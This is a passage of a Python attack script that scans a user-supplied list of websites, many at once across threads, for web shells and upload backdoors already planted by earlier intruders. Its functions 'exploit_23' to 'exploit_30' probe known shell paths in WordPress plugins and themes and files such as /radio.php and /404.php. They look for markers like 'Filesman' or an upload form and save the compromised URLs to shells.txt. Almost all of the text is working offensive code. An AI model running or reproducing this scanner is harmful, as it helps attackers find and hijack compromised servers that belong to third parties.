            if 'Negat1ve Shell' in check.content.decode("utf-8"):
                    print (' [#] Exploit 23 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ccx/index.php\n')
            else:
                print ('[#] Exploit 23 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_24(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/seoplugins/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 24 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/seoplugins/db.php?u\n')
            else:
                print ('[#] Exploit 24 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_25(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,timeout=15)
        if ('<title>Upload files...</title>' in check.content.decode("utf-8")):
                print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/index.php?3x=3x',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<title>Upload files...</title>' in check.content.decode("utf-8"):
                    print (' [#] Exploit 25 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/index.php?3x=3x\n')
            else:
                print ('[#] Exploit 25 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_26(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Gecko' in check.content.decode("utf-8")):
                print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/1.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/1.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Gecko' in check.content.decode("utf-8"):
                    print (' [#] Exploit 26 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/1.php\n')
            else:
                print ('[#] Exploit 26 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_27(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/radio.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/radio.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 27 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/radio.php\n')
            else:
                print ('[#] Exploit 27 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_28(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 28 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/404.php\n')
            else:
                print ('[#] Exploit 28 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_29(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,timeout=15)
        if ('ioptimization' in check.content.decode("utf-8")):
                print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/plugins/ioptimization/IOptimize.php?rchk',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'ioptimization' in check.content.decode("utf-8"):
                    print (' [#] Exploit 29 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/ioptimization/IOptimize.php?rchk\n')
            else:
                print ('[#] Exploit 29 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_30(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,timeout=15)
        if ('<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8")):
                print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/pridmag/db.php?u',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input name="_upl" type="submit" id="_upl" value="Upload">' in check.content.decode("utf-8"):
                    print (' [#] Exploit 30 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/pridmag/db.php?u\n')
            else:
                print ('[#] Exploit 30 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[×] Dead --> ' + url + ' {}[Failed]'.format(fr))

def run_code(site):
    try:
        
        exploit_1(site)
        exploit_2(site)
        exploit_3(site) 
        exploit_4(site)
        exploit_5(site)
        exploit_6(site)
        exploit_7(site)
        exploit_8(site)
        exploit_9(site) 
        exploit_11(site)
        exploit_12(site)
        exploit_13(site)
        exploit_14(site)
        exploit_15(site)
        exploit_16(site)
        exploit_17(site)
        exploit_18(site)
        exploit_19(site)
        exploit_20(site)
        exploit_21(site)
        exploit_22(site)
        exploit_23(site)
        exploit_24(site)
        exploit_25(site)
        exploit_26(site)
        exploit_27(site)
        exploit_28(site)
        exploit_29(site)
        exploit_30(site)
    except:
        pass


# #
# #call me h0rn3t sp1d3rs 
# mp = Pool(poolAmount)

# # call the function 
# mp.map(run_code, target)
 

# mp.close()
# mp.join()
filename = input("\033[1;31mENTER FILE NAME: ")
# file = open(filename).read().split()
file = open(filename, encoding="utf-8").read().split()

myfile = set(file)
thread = int(input("\033[1;31mThreads: "))

# Create a thread pool with a maximum of 10 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
    # Submit each URL to the thread pool
    futures = [executor.submit(run_code, site) for site in myfile]

    # Wait for all threads to complete
    concurrent.futures.wait(futures)